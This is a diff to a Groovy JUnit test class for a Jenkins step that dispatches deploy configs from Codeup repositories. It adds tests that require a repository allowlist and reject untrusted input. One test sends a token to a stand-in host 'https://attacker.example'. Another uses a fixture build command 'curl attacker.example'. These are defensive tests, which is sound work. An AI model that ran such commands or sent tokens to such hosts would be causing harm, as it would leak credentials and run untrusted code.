@@ -8,6 +8,7 @@ import org.junit.jupiter.api.AfterEach
 import org.junit.jupiter.api.Test
 
 import static org.junit.jupiter.api.Assertions.assertEquals
+import static org.junit.jupiter.api.Assertions.assertThrows
 import static org.junit.jupiter.api.Assertions.assertTrue
 
 class DispatchCodeupRepositoriesVarTest {
@@ -38,7 +39,7 @@ class DispatchCodeupRepositoriesVarTest {
         script.metaClass.echo = { Object message -> }
         script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }
 
-        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id']] as Object[])
+        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowAllRepositories: true]] as Object[])
 
         assertEquals(1, result.scannedRepositories)
         assertEquals(1, result.scannedFiles)
@@ -69,7 +70,7 @@ class DispatchCodeupRepositoriesVarTest {
         script.metaClass.echo = { Object message -> }
         script.metaClass.deployWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }
 
-        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id']] as Object[])
+        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowAllRepositories: true]] as Object[])
 
         assertEquals(1, result.scannedRepositories)
         assertEquals(1, result.scannedFiles)
@@ -101,7 +102,7 @@ class DispatchCodeupRepositoriesVarTest {
         script.metaClass.echo = { Object message -> }
         script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }
 
-        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id']] as Object[])
+        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowAllRepositories: true]] as Object[])
 
         assertEquals(2, result.scannedRepositories)
         assertEquals(1, result.dispatched)
@@ -136,7 +137,7 @@ class DispatchCodeupRepositoriesVarTest {
         script.metaClass.echo = { Object message -> }
         script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }
 
-        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowedMethods: ['deployJavaWeb']]] as Object[])
+        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowedMethods: ['deployJavaWeb'], allowAllRepositories: true]] as Object[])
 
         assertEquals(2, result.scannedRepositories)
         assertEquals(2, result.scannedFiles)
@@ -211,7 +212,7 @@ class DispatchCodeupRepositoriesVarTest {
         script.metaClass.echo = { Object message -> }
         script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }
 
-        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', jenkinsfileName: 'Jenkinsfile.release.groovy']] as Object[])
+        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', jenkinsfileName: 'Jenkinsfile.release.groovy', allowAllRepositories: true]] as Object[])
 
         assertEquals(1, result.scannedRepositories)
         assertEquals(1, result.scannedFiles)
@@ -274,12 +275,65 @@ class DispatchCodeupRepositoriesVarTest {
         script.metaClass.echo = { Object message -> }
         script.metaClass.deployJavaWeb = { Map customConfig -> dispatchCount++ }
 
-        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', dryRun: true]] as Object[])
+        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', dryRun: true, allowAllRepositories: true]] as Object[])
 
         assertEquals(1, result.scannedRepositories)
         assertEquals(1, result.scannedFiles)
         assertEquals(0, result.dispatched)
         assertEquals(0, dispatchCount)
+    }
+
+    @Test
+    void dispatchCodeupRepositoriesRequiresRepositoryTrustBoundary() {
+        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
+        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
+
+        IllegalArgumentException error = assertThrows(IllegalArgumentException.class) {
+            script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id']] as Object[])
+        }
+
+        assertTrue(error.message.contains('allowedRepositoryNames'))
+    }
+
+    @Test
+    void dispatchCodeupRepositoriesRejectsUntrustedTokenDestination() {
+        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
+        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
+
+        IllegalArgumentException error = assertThrows(IllegalArgumentException.class) {
+            script.invokeMethod('call', [[
+                    token: 'pt-token', organizationId: 'org-id',
+                    domain: 'https://attacker.example', allowAllRepositories: true
+            ]] as Object[])
+        }
+
+        assertTrue(error.message.contains('allowedDomains'))
+    }
+
+    @Test
+    void dispatchCodeupRepositoriesRejectsUnapprovedRemoteCommands() {
+        stubCodeupApi(
+                [[id: '1', name: 'repo-a']],
+                ['1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]],
+                ['1:Jenkinsfile.groovy': """
+                        def customConfig = [DEPLOY_PIPELINE: [stepsBuildNpm: [buildCMD: 'curl attacker.example']]]
+                        deployWeb(customConfig)
+                        """.stripIndent()]
+        )
+
+        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
+        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
+        script.metaClass.echo = { Object message -> }
+
+        Map result = (Map) script.invokeMethod('call', [[
+                token                 : 'pt-token',
+                organizationId        : 'org-id',
+                allowedRepositoryNames: ['repo-a'],
+                dryRun                : true
+        ]] as Object[])
+
+        assertEquals(1, result.rejected.size())
+        assertTrue(result.rejected[0].reason.contains('allowedCommandValues'))
     }
 
     private static void stubCodeupApi(List<Map<String, Object>> repositories,
